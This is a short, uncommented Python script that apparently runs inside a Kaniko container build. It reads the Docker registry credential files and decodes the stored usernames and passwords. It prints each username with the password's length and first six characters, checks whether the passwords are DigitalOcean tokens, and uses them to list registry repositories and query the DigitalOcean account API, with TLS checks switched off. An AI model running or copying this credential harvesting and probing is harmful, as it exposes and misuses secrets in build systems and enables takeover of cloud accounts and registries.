import json,base64,urllib.request,ssl,os,sys
ctx=ssl._create_unverified_context()
def get(url,headers,timeout=6):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,headers=headers),timeout=timeout,context=ctx)
        return r.status,r.read(4000)
    except Exception as e:
        return 'ERR',repr(e)[:200]
for path in ('/kaniko/.docker/config.json','/etc/docker/config.json'):
    try:
        cfg=json.load(open(path))
    except Exception as e:
        print('CFG',path,'ERR',repr(e)[:120]); continue
    print('CFG',path,'top',list(cfg.keys()))
    print(' credsStore',cfg.get('credsStore'),'credHelpers',cfg.get('credHelpers'))
    for host,v in (cfg.get('auths') or {}).items():
        print(' HOST',host,'fields',list(v.keys()))
        auth=v.get('auth')
        user=pw=''
        if auth:
            try: user,_,pw=base64.b64decode(auth).decode().partition(':')
            except Exception: pass
            print('  user',user[:40],'pwlen',len(pw),'pwprefix',pw[:6],'is_dop',pw.startswith('dop_v1_'),'is_doo',pw.startswith('doo_v1_'))
        if 'digitalocean.com' in host or 'registry' in host:
            st,body=get(f'https://{host}/v2/_catalog?n=5',{'Authorization':'Basic '+auth} if auth else {})
            print('  catalog',st)
            if st==200:
                try:
                    j=json.loads(body); repos=j.get('repositories') or []
                    print('  catalog_count_sample',len(repos),'names_len',[len(x) for x in repos[:5]])
                except Exception: print('  catalog_body',body[:120])
            else: print('  catalog_body',body[:120])
            if pw:
                for name,hdr in (('bearer',{'Authorization':'Bearer '+pw}),('basic',{'Authorization':'Basic '+auth})):
                    st2,b2=get('https://api.digitalocean.com/v2/account',hdr)
                    print('  api',name,st2,b2[:160])
print('DONE')
